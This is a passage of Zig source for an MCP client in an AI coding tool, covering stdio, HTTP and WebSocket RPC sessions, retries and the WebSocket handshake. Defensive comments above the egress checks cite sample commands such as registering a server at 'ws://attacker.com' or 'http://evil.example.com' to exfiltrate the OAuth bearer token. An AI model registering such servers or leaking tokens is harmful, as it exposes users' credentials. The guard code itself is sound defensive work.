        const request = try encodeRpcRequestRawParamsAlloc(self.allocator, request_id, method, params_json);
        defer self.allocator.free(request);
        try writeRpcFrame(std_io.fileWriter(session.stdin), request, session.framing);

        const response = try readRpcResponseById(self, server_name, session.stdout, session.stdin, request_id, rpcTimeoutMsForMethod(method));
        session.framing = response.mode;
        return response.payload;
    }

    fn initializeStdioInfo(self: *Client, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !InitializeInfo {
        const request_modes = [_]RpcFrameMode{ .content_length, .jsonl };
        var last_err: anyerror = error.McpResponseTimeout;

        for (request_modes) |request_mode| {
            var session = try spawnStdioSessionFromTransport(self.allocator, transport, auth_token);
            defer session.deinit();

            const handshake = sendInitialize(self, server_name, session.stdin, session.stdout, connectionTimeoutMs(), request_mode) catch |err| {
                last_err = err;
                continue;
            };
            defer self.allocator.free(handshake.response_json);

            const info = parseInitializeInfo(self.allocator, handshake.response_json) catch |err| {
                last_err = err;
                continue;
            };
            return info;
        }

        return last_err;
    }

    fn rpcWebSocket(self: *Client, server_name: []const u8, transport: []const u8, method: []const u8, params_json: []const u8, auth_token: ?[]const u8) ![]u8 {
        var ws = try self.connectWebSocket(transport, auth_token);
        defer ws.deinit();

        var info = try self.sendWebSocketInitialize(server_name, &ws);
        defer info.deinit(self.allocator);

        const request_id = self.nextRpcId();
        const request = try encodeRpcRequestRawParamsAlloc(self.allocator, request_id, method, params_json);
        defer self.allocator.free(request);

        try websocket.writeClientTextFrame(ws.connection.writer(), request);
        try ws.connection.flush();

        return readWebSocketResponseById(self, server_name, ws.connection, request_id);
    }

    fn initializeWebSocketInfo(self: *Client, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !InitializeInfo {
        var ws = try self.connectWebSocket(transport, auth_token);
        defer ws.deinit();
        return self.sendWebSocketInitialize(server_name, &ws);
    }

    fn connectWebSocket(self: *Client, transport: []const u8, auth_token: ?[]const u8) !WebSocketConnection {
        // Route through the central egress chokepoint BEFORE we
        // open the TCP connection. WebSocket MCP transports carry
        // the same OAuth Bearer token in their handshake as the
        // HTTP path does, so a `mcp add evil ws://attacker.com/...`
        // would otherwise leak it on the wire. The pass-80 update
        // to egress.checkUrl recognizes ws:// (loopback only) and
        // wss:// (any host with SSRF guard), so the loopback case
        // (stdio-bridged-to-WS local servers) keeps working.
        switch (egress.checkUrl(self.allocator, transport, .{})) {
            .allow => {},
            .deny_scheme, .deny_ssrf, .deny_allowlist, .deny_denylist => return error.UrlPolicyDenied,
        }

        const uri = try std.Uri.parse(transport);
        const protocol = std.http.Client.Protocol.fromUri(uri) orelse return error.UnsupportedMcpTransport;

        const http_client = try self.allocator.create(std.http.Client);
        errdefer self.allocator.destroy(http_client);
        http_client.* = .{ .allocator = self.allocator, .io = rt.io };
        errdefer http_client.deinit();

        var host_buf: [std.Io.net.HostName.max_len]u8 = undefined;
        const host = try uri.getHost(&host_buf);
        const port = uri.port orelse defaultPortForScheme(uri.scheme);
        const connection = try http_client.connectTcp(host, port, protocol);
        errdefer {
            connection.closing = true;
            http_client.connection_pool.release(connection, rt.io);
        }

        try performWebSocketHandshake(self.allocator, connection, uri, auth_token);
        return .{
            .http_client = http_client,
            .connection = connection,
        };
    }

    fn sendWebSocketInitialize(self: *Client, server_name: []const u8, ws: *WebSocketConnection) !InitializeInfo {
        const init_req = try encodeRpcRequestRawParamsAlloc(self.allocator, 1, "initialize", initParamsJson);
        defer self.allocator.free(init_req);
        try websocket.writeClientTextFrame(ws.connection.writer(), init_req);
        try ws.connection.flush();

        const init_resp = try readWebSocketResponseById(self, server_name, ws.connection, 1);
        defer self.allocator.free(init_resp);

        const info = try parseInitializeInfo(self.allocator, init_resp);
        // Cache the instructions block so downstream callers (prompt
        // engine, /mcp test) can read it without re-handshaking.
        self.cacheServerInstructions(server_name, info.instructions) catch {};

        const initialized = try encodeRpcNotificationRawParamsAlloc(self.allocator, "notifications/initialized", "{}");
        defer self.allocator.free(initialized);
        try websocket.writeClientTextFrame(ws.connection.writer(), initialized);
        try ws.connection.flush();

        return info;
    }

    fn rpcHttp(self: *Client, server_name: []const u8, transport: []const u8, method: []const u8, params_json: []const u8, auth_token: ?[]const u8) ![]u8 {
        try self.ensureHttpInitialized(server_name, transport, auth_token);

        // attempts 0..MAX_SESSION_RETRIES inclusive: the first call plus up to
        // MAX_SESSION_RETRIES (2) re-init-and-retry passes on session expiry.
        var attempts: u8 = 0;
        while (attempts <= MAX_SESSION_RETRIES) : (attempts += 1) {
            const request_id = self.nextRpcId();
            const request = try encodeRpcRequestRawParamsAlloc(self.allocator, request_id, method, params_json);
            defer self.allocator.free(request);

            var response = self.postHttpRpc(transport, request, auth_token, self.getHttpSessionId(server_name), self.getHttpProtocolVersion(server_name), rpcTimeoutMsForMethod(method)) catch |err| {
                // A transport-level terminal error (connection reset, timeout,
                // broken pipe) bumps the consecutive-error counter; at the
                // threshold the session is force-closed (mcp-13).
                if (!isTerminalError(err)) return err;
                const tripped = self.noteHttpTerminalError(server_name);
                if (tripped or attempts >= MAX_SESSION_RETRIES) return err;
                self.clearHttpSession(server_name);
                try self.ensureHttpInitialized(server_name, transport, auth_token);
                continue;
            };
            defer response.deinit(self.allocator);

            // Session-expiry retry: HTTP 404 + JSON-RPC code -32001
            // (session-not-found). Re-init with a fresh session and retry the
            // call. A bare 409 (conflict) also re-inits. Reference:
            // client.ts:1911-1922.
            const rpc_code = parsers.parseRpcErrorCode(self.allocator, response.body);
            const session_expired = parsers.isSessionExpired(response.status_code, rpc_code);
            if ((session_expired or response.status_code == 409) and self.isHttpInitialized(server_name) and attempts < MAX_SESSION_RETRIES) {
                self.clearHttpSession(server_name);
                try self.ensureHttpInitialized(server_name, transport, auth_token);
                continue;
            }

            try ensureHttpStatusOk(response.status_code, response.body);
            if (response.session_id) |session_id| try self.putHttpSession(server_name, session_id, null);
            self.resetTerminalErrorCounts(server_name);
            return try extractRpcEnvelopeJson(self, server_name, response.body, request_id, .{
                .transport = transport,
                .auth_token = auth_token,
                .session_id = response.session_id orelse self.getHttpSessionId(server_name),
                .protocol_version = self.getHttpProtocolVersion(server_name),
            });
        }

        return error.HttpStatusCode;
    }

    /// Structured HTTP/SSE RPC: resolve the server's static + dynamic
    /// (`headersHelper`) headers from its `ServerConfig`, install them as the
    /// in-flight extra-header overlay, and run the normal `rpcHttp` path (which
    /// covers both the init handshake and the call). The overlay is applied on
    /// top of the hardcoded Content-Type/Accept/Authorization/MCP-Protocol set,
    /// a config header overriding a default where keys collide (mcp-04). A helper
    /// failure never blocks the connection -- `getMcpServerHeaders` falls back to
    /// the static headers.
    fn rpcHttpStructured(
        self: *Client,
        cfg: *const mcp_config.ServerConfig,
        server_name: []const u8,
        transport: []const u8,
        method: []const u8,
        params_json: []const u8,
        auth_token: ?[]const u8,
    ) ![]u8 {
        const headers = try headers_helper.getMcpServerHeaders(self.allocator, cfg, .{
            // A live connect is non-interactive here (the request comes from the
            // agent runtime, not a TUI prompt), which bypasses the project/local
            // helper trust gate -- matching the reference's CI/automation
            // carve-out. Interactive trust prompting is deferred (phase plan).
            .interactive = false,
        });
        defer headers_helper.freeHeaders(self.allocator, headers);

        const prev = self.http_extra_headers;
        self.http_extra_headers = headers;
        defer self.http_extra_headers = prev;

        return self.rpcHttp(server_name, transport, method, params_json, auth_token);
    }

    fn ensureHttpInitialized(self: *Client, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !void {
        if (self.isHttpInitialized(server_name)) return;
        var info = try self.initializeHttpInfo(server_name, transport, auth_token);
        defer info.deinit(self.allocator);
        // Cache the server's optional instructions block so the prompt
        // engine can surface it to the model without re-handshaking.
        self.cacheServerInstructions(server_name, info.instructions) catch {};
    }

    fn initializeHttpInfo(self: *Client, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !InitializeInfo {
        const request_id = self.nextRpcId();
        const init_req = try encodeRpcRequestRawParamsAlloc(self.allocator, request_id, "initialize", initParamsJson);
        defer self.allocator.free(init_req);

        var response = try self.postHttpRpc(transport, init_req, auth_token, null, null, connectionTimeoutMs());
        defer response.deinit(self.allocator);
        try ensureHttpStatusOk(response.status_code, response.body);

        const envelope = try extractRpcEnvelopeJson(self, server_name, response.body, request_id, .{
            .transport = transport,
            .auth_token = auth_token,
            .session_id = response.session_id,
            .protocol_version = null,
        });
        defer self.allocator.free(envelope);

        const info = try parseInitializeInfo(self.allocator, envelope);
        try self.putHttpSession(server_name, response.session_id, info.protocol_version);

        const initialized = try encodeRpcNotificationRawParamsAlloc(self.allocator, "notifications/initialized", "{}");
        defer self.allocator.free(initialized);

        var notif = try self.postHttpRpc(transport, initialized, auth_token, self.getHttpSessionId(server_name), self.getHttpProtocolVersion(server_name), connectionTimeoutMs());
        defer notif.deinit(self.allocator);
        try ensureHttpStatusOk(notif.status_code, notif.body);
        if (notif.session_id) |session_id| try self.putHttpSession(server_name, session_id, null);

        return info;
    }

    fn postHttpRpc(self: *Client, transport: []const u8, body: []const u8, auth_token: ?[]const u8, session_id: ?[]const u8, protocol_version: ?[]const u8, timeout_ms: u32) !HttpResponse {
        // `http_extra_headers` carries the resolved static + dynamic
        // `headersHelper` headers when the in-flight call originated from a
        // structured `ServerConfig` (mcp-04); it is empty for legacy
        // transport-string calls, so this is a no-op overlay there.
        return self.postHttpRpcWithHeaders(transport, body, auth_token, session_id, protocol_version, self.http_extra_headers, timeout_ms);
    }

    /// Like `postHttpRpc` but overlays `extra_headers` (the static + dynamic
    /// `headersHelper` headers resolved by `mcp/headers_helper.zig`) on top of
    /// the hardcoded Content-Type/Accept/Authorization/Mcp-Session-Id/
    /// MCP-Protocol-Version set. A config header that names one of the defaults
    /// overrides it (case-insensitive), EXCEPT the live `Mcp-Session-Id`, which
    /// the transport always controls and a config header must never clobber
    /// (mcp-04).
    fn postHttpRpcWithHeaders(
        self: *Client,
        transport: []const u8,
        body: []const u8,
        auth_token: ?[]const u8,
        session_id: ?[]const u8,
        protocol_version: ?[]const u8,
        extra_headers: []const mcp_config.HeaderEntry,
        timeout_ms: u32,
    ) !HttpResponse {
        // Route through the central egress chokepoint BEFORE building
        // headers (which bake in the OAuth Bearer token). The MCP HTTP
        // transport bypasses providers/common.zig::callHttp by going
        // directly to writeCurlRequestFiles, so it would otherwise
        // skip the pass-73 scheme/SSRF check. A user who registered
        // `mcp add evilserver http://evil.example.com/mcp/` could
        // exfiltrate the OAuth token over plaintext HTTP without
        // this guard.
        switch (egress.checkUrl(self.allocator, transport, .{})) {
            .allow => {},
            .deny_scheme, .deny_ssrf, .deny_allowlist, .deny_denylist => return error.UrlPolicyDenied,
        }

        // Collect all headers into a flat []const []const u8 first so we can
        // hand them to the shared curl-config builder. This keeps the
        // Authorization token and session-id off argv, matching the fix in
        // providers/common.zig::callHttp. The argv that actually reaches the
        // curl process has no secrets.
        var owned_headers = try buildHttpHeaderLines(self.allocator, auth_token, session_id, protocol_version, extra_headers);
        defer {
            for (owned_headers.items) |header| self.allocator.free(header);
            owned_headers.deinit();
        }

        var header_slices = try self.allocator.alloc([]const u8, owned_headers.items.len);
        defer self.allocator.free(header_slices);
        for (owned_headers.items, 0..) |h, i| header_slices[i] = h;

        const secrets = try http_common.writeCurlRequestFiles(
            self.allocator,
            "POST",
            transport,
            header_slices,
            body,
            .POST,
        );
        defer secrets.cleanup(self.allocator);

        const status_marker = "\n__ZCODE_HTTP_STATUS__:";

        var timeout_buf: [16]u8 = undefined;
        // Round up to whole seconds in u64 so a near-maxInt(u32) tool timeout
        // does not overflow the `+ 999` before the divide.
        const timeout_secs: u64 = @max(@as(u64, 1), (@as(u64, timeout_ms) + 999) / 1000);
        const timeout_str = std.fmt.bufPrint(&timeout_buf, "{d}", .{timeout_secs}) catch "20";

        var connect_timeout_buf: [16]u8 = undefined;
        const connect_timeout_secs: u64 = @max(@as(u64, 1), @min(timeout_secs, 10));
        const connect_timeout_str = std.fmt.bufPrint(&connect_timeout_buf, "{d}", .{connect_timeout_secs}) catch "10";

        const argv = [_][]const u8{
            "curl",
            "--no-buffer",
            "-sS",
            "--max-time",
            timeout_str,
            "--connect-timeout",
            connect_timeout_str,
            "-D",
            "-",
            "--write-out",
            status_marker ++ "%{http_code}",
            "-K",
            secrets.config_path,
        };

        const result = std.process.run(self.allocator, rt.io, .{
            .argv = &argv,
            .stdout_limit = .limited(16 * 1024 * 1024),
            .stderr_limit = .limited(16 * 1024 * 1024),
        }) catch |err| switch (err) {
            error.FileNotFound => return error.HttpTransport,
            error.StreamTooLong => return error.HttpTransport,
            else => return error.HttpTransport,
        };
        defer self.allocator.free(result.stderr);
        defer self.allocator.free(result.stdout);

        const code: u8 = switch (result.term) {
            .exited => |exit_code| exit_code,
            else => return error.HttpTransport,
        };
        if (code != 0) return error.HttpTransport;

        const parsed = parseCurlHttpResponse(result.stdout, status_marker) orelse return error.HttpTransport;
        return .{
            .status_code = parsed.status_code,
            .body = try self.allocator.dupe(u8, parsed.body),
            .session_id = if (parsed.session_id) |value| try self.allocator.dupe(u8, value) else null,
        };
    }

    fn putHttpSession(self: *Client, server_name: []const u8, session_id: ?[]const u8, protocol_version: ?[]const u8) !void {
        const owned_key = try self.allocator.dupe(u8, server_name);
        errdefer self.allocator.free(owned_key);

        const gop = try self.http_sessions.getOrPut(self.allocator, owned_key);
        const preserved_session_id = if (gop.found_existing and session_id == null and gop.value_ptr.session_id != null)
            try self.allocator.dupe(u8, gop.value_ptr.session_id.?)
        else
            null;
        errdefer if (preserved_session_id) |value| self.allocator.free(value);
        const preserved_protocol = if (gop.found_existing and protocol_version == null and gop.value_ptr.protocol_version != null)
            try self.allocator.dupe(u8, gop.value_ptr.protocol_version.?)
        else
            null;
        errdefer if (preserved_protocol) |value| self.allocator.free(value);
        if (gop.found_existing) {
            self.allocator.free(owned_key);
            gop.value_ptr.deinit(self.allocator);
        }

        gop.value_ptr.* = .{
            .initialized = true,
            .session_id = if (session_id) |value| try self.allocator.dupe(u8, value) else preserved_session_id,
            .protocol_version = if (protocol_version) |value| try self.allocator.dupe(u8, value) else preserved_protocol,
        };
    }

    fn clearHttpSession(self: *Client, server_name: []const u8) void {
        if (self.http_sessions.getPtr(server_name)) |entry| {
            entry.deinit(self.allocator);
        }
    }

    /// Force-close an HTTP session: unlike `clearHttpSession` (which resets the
    /// entry in place so the key survives for session-expiry re-init), this
    /// removes the entry from the map entirely so a force-reconnect starts from
    /// a clean slate. Idempotent: a missing entry is a no-op (mirrors the
    /// reference's hasTriggeredClose guard so a double force-close cannot
    /// double-free). Used when the consecutive terminal-error threshold trips.
    fn forceCloseHttpSession(self: *Client, server_name: []const u8) void {
        if (self.http_sessions.fetchRemove(server_name)) |entry| {
            self.allocator.free(entry.key);
            var session = entry.value;
            session.deinit(self.allocator);
        }
    }

    /// Record one terminal connection error against the named session's
    /// transport-specific counter and, when the count reaches
    /// MAX_ERRORS_BEFORE_RECONNECT, force-close that session so the next call
    /// reconnects fresh (mcp-13). Returns true when the threshold tripped and
    /// the session was force-closed.
    fn noteHttpTerminalError(self: *Client, server_name: []const u8) bool {
        const entry = self.http_sessions.getPtr(server_name) orelse return false;
        entry.terminal_error_count +|= 1;
        if (entry.terminal_error_count >= MAX_ERRORS_BEFORE_RECONNECT) {
            self.forceCloseHttpSession(server_name);
            return true;
        }
        return false;
    }

    fn noteStdioTerminalError(self: *Client, server_name: []const u8) bool {
        const entry = self.stdio_sessions.getPtr(server_name) orelse return false;
        entry.terminal_error_count +|= 1;
        if (entry.terminal_error_count >= MAX_ERRORS_BEFORE_RECONNECT) {
            self.clearStdioSession(server_name);
            return true;
        }
        return false;
    }

    fn noteWebSocketTerminalError(self: *Client, server_name: []const u8) bool {
        const entry = self.websocket_sessions.getPtr(server_name) orelse return false;
        entry.terminal_error_count +|= 1;
        if (entry.terminal_error_count >= MAX_ERRORS_BEFORE_RECONNECT) {
            self.clearWebSocketSession(server_name);
            return true;
        }
        return false;
    }

    /// Reset the consecutive terminal-error counters for a server after a
    /// successful RPC (a non-terminal outcome means the link is healthy again).
    fn resetTerminalErrorCounts(self: *Client, server_name: []const u8) void {
        if (self.http_sessions.getPtr(server_name)) |e| e.terminal_error_count = 0;
        if (self.stdio_sessions.getPtr(server_name)) |e| e.terminal_error_count = 0;
        if (self.websocket_sessions.getPtr(server_name)) |e| e.terminal_error_count = 0;
    }

    /// Drop every cached session (stdio / http / websocket) for `name` so the
    /// next RPC reconnects from scratch. The explicit `/mcp reconnect` analog
    /// (reference reconnectMcpServerImpl / clearServerCache,
    /// client.ts:2137-2156). Idempotent: clearing an absent session is a no-op.
    pub fn reconnect(self: *Client, name: []const u8) void {
        self.forceCloseHttpSession(name);
        self.clearStdioSession(name);
        self.clearWebSocketSession(name);
    }

    fn isHttpInitialized(self: *Client, server_name: []const u8) bool {
        if (self.http_sessions.getPtr(server_name)) |entry| {
            return entry.initialized;
        }
        return false;
    }

    fn getHttpSessionId(self: *Client, server_name: []const u8) ?[]const u8 {
        if (self.http_sessions.getPtr(server_name)) |entry| {
            return entry.session_id;
        }
        return null;
    }

    fn getHttpProtocolVersion(self: *Client, server_name: []const u8) ?[]const u8 {
        if (self.http_sessions.getPtr(server_name)) |entry| {
            return entry.protocol_version;
        }
        return null;
    }

    fn ensureStdioSession(self: *Client, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !*StdioSession {
        return self.ensureStdioSessionInner(null, server_name, transport, auth_token);
    }

    /// `cfg` (when non-null) drives a structured spawn (`command ++ args`, parent
    /// env + per-server env); when null the legacy `transport`-string spawn is
    /// used. The persistent session is keyed by `server_name` either way.
    fn ensureStdioSessionInner(self: *Client, cfg: ?*const mcp_config.ServerConfig, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !*StdioSession {
        if (self.stdio_sessions.getPtr(server_name)) |session| {
            if (!session.initialized) {
                const handshake = try sendInitialize(self, server_name, session.stdin, session.stdout, connectionTimeoutMs(), session.framing);
                defer self.allocator.free(handshake.response_json);
                session.framing = handshake.mode;
                session.initialized = true;
            }
            return session;
        }

        var session = try self.initializeFreshStdioSessionInner(cfg, server_name, transport, auth_token);
        errdefer session.deinit();

        const owned_key = try self.allocator.dupe(u8, server_name);
        errdefer self.allocator.free(owned_key);
        const gop = try self.stdio_sessions.getOrPut(self.allocator, owned_key);
        if (gop.found_existing) {
            self.allocator.free(owned_key);
            gop.value_ptr.deinit();
        }
        gop.value_ptr.* = session;
        return gop.value_ptr;
    }

    fn rpcStdioPersistent(self: *Client, server_name: []const u8, transport: []const u8, method: []const u8, params_json: []const u8, auth_token: ?[]const u8) ![]u8 {
        return self.rpcStdioPersistentInner(null, server_name, transport, method, params_json, auth_token);
    }

    /// Structured stdio RPC: spawn the persistent session from the `ServerConfig`
    /// (`command ++ args` with parent env + per-server env merged on top, no
    /// `zsh -lc` wrapper) instead of a legacy transport string (mcp-02 live
    /// wiring). The session reuse / terminal-error / retry behavior is identical.
    fn rpcStdioPersistentStructured(self: *Client, cfg: *const mcp_config.ServerConfig, server_name: []const u8, method: []const u8, params_json: []const u8, auth_token: ?[]const u8) ![]u8 {
        return self.rpcStdioPersistentInner(cfg, server_name, "", method, params_json, auth_token);
    }

    fn rpcStdioPersistentInner(self: *Client, cfg: ?*const mcp_config.ServerConfig, server_name: []const u8, transport: []const u8, method: []const u8, params_json: []const u8, auth_token: ?[]const u8) ![]u8 {
        var attempt: u8 = 0;
        while (attempt < 2) : (attempt += 1) {
            const session = try self.ensureStdioSessionInner(cfg, server_name, transport, auth_token);
            const request_id = self.nextRpcId();
            const request = try encodeRpcRequestRawParamsAlloc(self.allocator, request_id, method, params_json);
            defer self.allocator.free(request);
            try writeRpcFrame(std_io.fileWriter(session.stdin), request, session.framing);

            const response = readRpcResponseById(self, server_name, session.stdout, session.stdin, request_id, rpcTimeoutMsForMethod(method)) catch |err| {
                if (!isTerminalError(err)) return err;
                // Bump the consecutive-error counter; at the threshold the
                // session is force-closed (mcp-13). Either way the broken
                // session must be cleared before a same-call retry.
                const tripped = self.noteStdioTerminalError(server_name);
                self.clearStdioSession(server_name);
                if (tripped or attempt != 0) return err;
                continue;
            };
            session.framing = response.mode;
            self.resetTerminalErrorCounts(server_name);
            return response.payload;
        }
        return error.McpResponseTimeout;
    }

    fn initializeFreshStdioSession(self: *Client, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !StdioSession {
        return self.initializeFreshStdioSessionInner(null, server_name, transport, auth_token);
    }

    fn initializeFreshStdioSessionInner(self: *Client, cfg: ?*const mcp_config.ServerConfig, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !StdioSession {
        const request_modes = [_]RpcFrameMode{ .content_length, .jsonl };
        var last_err: anyerror = error.McpResponseTimeout;

        for (request_modes) |request_mode| {
            var session = if (cfg) |c|
                try spawnStdioSession(self.allocator, c.command orelse return error.MissingStdioCommand, c.args, c.env, auth_token)
            else
                try spawnStdioSessionFromTransport(self.allocator, transport, auth_token);
            var keep_session = false;
            defer if (!keep_session) session.deinit();

            const handshake = sendInitialize(self, server_name, session.stdin, session.stdout, connectionTimeoutMs(), request_mode) catch |err| {
                last_err = err;
                continue;
            };
            defer self.allocator.free(handshake.response_json);

            // Cache the server's optional InitializeResult.instructions
            // block so the prompt engine can surface it to the model on
            // subsequent turns without re-handshaking. Best-effort --
            // a parse failure or OOM here should not abort the session
            // init itself.
            var info = parsers.parseInitializeInfo(self.allocator, handshake.response_json) catch null;
            if (info) |*parsed| {
                defer parsed.deinit(self.allocator);
                self.cacheServerInstructions(server_name, parsed.instructions) catch {};
            }

            session.initialized = true;
            session.framing = handshake.mode;
            keep_session = true;
            return session;
        }

        return last_err;
    }

    fn clearStdioSession(self: *Client, server_name: []const u8) void {
        if (self.stdio_sessions.fetchRemove(server_name)) |entry| {
            self.allocator.free(entry.key);
            var session = entry.value;
            session.deinit();
        }
    }

    fn ensureWebSocketSession(self: *Client, server_name: []const u8, transport: []const u8, auth_token: ?[]const u8) !*PersistentWebSocketSession {
        if (self.websocket_sessions.getPtr(server_name)) |session| {
            if (!session.initialized) {
                var info = try self.sendWebSocketInitialize(server_name, &session.socket);
                info.deinit(self.allocator);
                session.initialized = true;
            }
            return session;
        }

        var session = PersistentWebSocketSession{
            .socket = try self.connectWebSocket(transport, auth_token),
            .initialized = false,
        };
        errdefer session.deinit();

        var info = try self.sendWebSocketInitialize(server_name, &session.socket);
        info.deinit(self.allocator);
        session.initialized = true;

        const owned_key = try self.allocator.dupe(u8, server_name);
        errdefer self.allocator.free(owned_key);
        const gop = try self.websocket_sessions.getOrPut(self.allocator, owned_key);
        if (gop.found_existing) {
            self.allocator.free(owned_key);
            gop.value_ptr.deinit();
        }
        gop.value_ptr.* = session;
        return gop.value_ptr;
    }

    fn rpcWebSocketPersistent(self: *Client, server_name: []const u8, transport: []const u8, method: []const u8, params_json: []const u8, auth_token: ?[]const u8) ![]u8 {
        var attempt: u8 = 0;
        while (attempt < 2) : (attempt += 1) {
            const session = try self.ensureWebSocketSession(server_name, transport, auth_token);
            const request_id = self.nextRpcId();
            const request = try encodeRpcRequestRawParamsAlloc(self.allocator, request_id, method, params_json);
            defer self.allocator.free(request);
            try websocket.writeClientTextFrame(session.socket.connection.writer(), request);
            try session.socket.connection.flush();

            const payload = readWebSocketResponseById(self, server_name, session.socket.connection, request_id) catch |err| {
                if (!isTerminalError(err)) return err;
                const tripped = self.noteWebSocketTerminalError(server_name);
                self.clearWebSocketSession(server_name);
                if (tripped or attempt != 0) return err;
                continue;
            };
            self.resetTerminalErrorCounts(server_name);
            return payload;
        }
        return error.McpResponseTimeout;
    }

    fn clearWebSocketSession(self: *Client, server_name: []const u8) void {
        if (self.websocket_sessions.fetchRemove(server_name)) |entry| {
            self.allocator.free(entry.key);
            var session = entry.value;
            session.deinit();
        }
    }

    fn activeBridge(self: *Client) ?ClientBridge {
        if (self.bridge_stack.items.len == 0) return null;
        return self.bridge_stack.items[self.bridge_stack.items.len - 1];
    }

    fn cloneNotifications(self: *Client, maybe_server_name: ?[]const u8) ![]NotificationEvent {
        var out = std.array_list.Managed(NotificationEvent).init(self.allocator);
        errdefer {
            for (out.items) |event| {
                self.allocator.free(event.server);
                self.allocator.free(event.method);
                self.allocator.free(event.params_json);
            }
            out.deinit();
        }

        for (self.notifications.items) |event| {
            if (maybe_server_name) |server_name| {
                if (!std.mem.eql(u8, event.server, server_name)) continue;
            }
            try out.ensureUnusedCapacity(1);
            const cloned = try dupeNotificationEvent(
                self.allocator,
                event.server,
                event.method,
                event.params_json,
                event.timestamp,
            );
            out.appendAssumeCapacity(cloned);
        }
        return out.toOwnedSlice();
    }

    fn recordNotification(self: *Client, server_name: []const u8, method: []const u8, params_json: []const u8) !void {
        // Suppress internal server error notifications - they're noise from MCP protocol
        if (std.mem.eql(u8, method, "notifications/message")) {
            if (std.mem.indexOf(u8, params_json, "Internal Server Error") != null or
                std.mem.indexOf(u8, params_json, "exception_handler") != null)
            {
                return;
            }
        }
        try self.notifications.ensureUnusedCapacity(1);
        const cloned = try dupeNotificationEvent(
            self.allocator,
            server_name,
            method,
            params_json,
            clock.nowSeconds(),
        );
        self.notifications.appendAssumeCapacity(cloned);
        while (self.notifications.items.len > MAX_NOTIFICATION_EVENTS) {
            const oldest = self.notifications.orderedRemove(0);
            self.allocator.free(oldest.server);
            self.allocator.free(oldest.method);
            self.allocator.free(oldest.params_json);
        }

        if (self.activeBridge()) |bridge| {
            if (bridge.handle_notification) |handler| {
                handler(bridge.ctx, self.allocator, server_name, method, params_json) catch {};
            }
        }
    }
};

/// Perform the RFC 6455 client upgrade handshake on an already-connected
/// TCP `connection`, sending `Authorization: Bearer <auth_token>` when a
/// token is supplied. Public so the outbound IDE MCP client
/// (`mcp/ide_client.zig`) can reuse the exact same handshake instead of
/// duplicating it.
pub fn performWebSocketHandshake(allocator: std.mem.Allocator, connection: *std.http.Client.Connection, uri: std.Uri, auth_token: ?[]const u8) !void {
    const host_header = try websocketHostHeaderAlloc(allocator, uri);
    defer allocator.free(host_header);

    const path_query = try websocketPathQueryAlloc(allocator, uri);
    defer allocator.free(path_query);

    var client_key_bytes: [16]u8 = undefined;
    rng.secureBytes(&client_key_bytes);
    var client_key_b64: [24]u8 = undefined;
    _ = std.base64.standard.Encoder.encode(&client_key_b64, &client_key_bytes);

    const writer = connection.writer();
    try writer.print("GET {s} HTTP/1.1\r\n", .{path_query});
    try writer.print("Host: {s}\r\n", .{host_header});
    try writer.writeAll("Upgrade: websocket\r\n");
    try writer.writeAll("Connection: Upgrade\r\n");
    try writer.writeAll("Sec-WebSocket-Version: 13\r\n");
    try writer.print("Sec-WebSocket-Key: {s}\r\n", .{&client_key_b64});
    if (auth_token) |token| {
        try writer.print("Authorization: Bearer {s}\r\n", .{token});
    }
    try writer.writeAll("\r\n");
    try connection.flush();

    const reader = connection.reader();
    const status_raw = (try reader.takeDelimiter('\n')) orelse return error.InvalidResponse;
    const status_line = std.mem.trim(u8, status_raw, " \t\r");
    const status_code = parseHttpStatusCode(status_line) orelse return error.InvalidResponse;
    if (status_code == 401 or status_code == 403) return error.AuthenticationFailed;
    if (status_code != 101) return error.InvalidResponse;

    var accept_value: ?[]u8 = null;
    while (true) {
        const line_raw = (try reader.takeDelimiter('\n')) orelse return error.InvalidResponse;
        const line = std.mem.trim(u8, line_raw, " \t\r");
        if (line.len == 0) break;
        if (headerLineValue(line, "Sec-WebSocket-Accept")) |value| {
            accept_value = try allocator.dupe(u8, value);
        }
    }
    defer if (accept_value) |value| allocator.free(value);

    const accept = accept_value orelse return error.InvalidResponse;
    var expected_accept: [28]u8 = undefined;
    websocket.computeAcceptKey(&expected_accept, &client_key_b64);
    if (!std.mem.eql(u8, accept, &expected_accept)) return error.InvalidResponse;
}

fn websocketHostHeaderAlloc(allocator: std.mem.Allocator, uri: std.Uri) ![]u8 {
    var host_buf: [std.Io.net.HostName.max_len]u8 = undefined;
    const host = try uri.getHost(&host_buf);
    const port = uri.port orelse return allocator.dupe(u8, host.bytes);
    const default_port = defaultPortForScheme(uri.scheme);
    if (port == default_port) return allocator.dupe(u8, host.bytes);
    if (std.mem.indexOfScalar(u8, host.bytes, ':') != null) {
        return std.fmt.allocPrint(allocator, "[{s}]:{d}", .{ host.bytes, port });
    }
    return std.fmt.allocPrint(allocator, "{s}:{d}", .{ host.bytes, port });
}

fn websocketPathQueryAlloc(allocator: std.mem.Allocator, uri: std.Uri) ![]u8 {
    const path = if (uri.path.isEmpty())
        try allocator.dupe(u8, "/")
    else
        try std.fmt.allocPrint(allocator, "{f}", .{std.fmt.alt(uri.path, .formatPath)});
    defer allocator.free(path);

    if (uri.query) |query| {
        const encoded_query = try std.fmt.allocPrint(allocator, "{f}", .{std.fmt.alt(query, .formatQuery)});
        defer allocator.free(encoded_query);
        return std.fmt.allocPrint(allocator, "{s}?{s}", .{ path, encoded_query });
    }

    return allocator.dupe(u8, path);
}

fn parseHttpStatusCode(status_line: []const u8) ?u16 {
    if (!std.mem.startsWith(u8, status_line, "HTTP/")) return null;
    var parts = std.mem.splitScalar(u8, status_line, ' ');
    _ = parts.next() orelse return null;
    const code = parts.next() orelse return null;
    return std.fmt.parseInt(u16, code, 10) catch null;
}

fn headerLineValue(line: []const u8, name: []const u8) ?[]const u8 {
    const colon = std.mem.indexOfScalar(u8, line, ':') orelse return null;
    const key = std.mem.trim(u8, line[0..colon], " \t");
    if (!std.ascii.eqlIgnoreCase(key, name)) return null;
    return std.mem.trim(u8, line[colon + 1 ..], " \t");
}

fn readServers(allocator: std.mem.Allocator, registry_path: []const u8) ![]Server {
    const bytes = std.Io.Dir.cwd().readFileAlloc(rt.io, registry_path, allocator, .limited(512 * 1024)) catch |err| switch (err) {
        error.FileNotFound => return allocator.alloc(Server, 0),
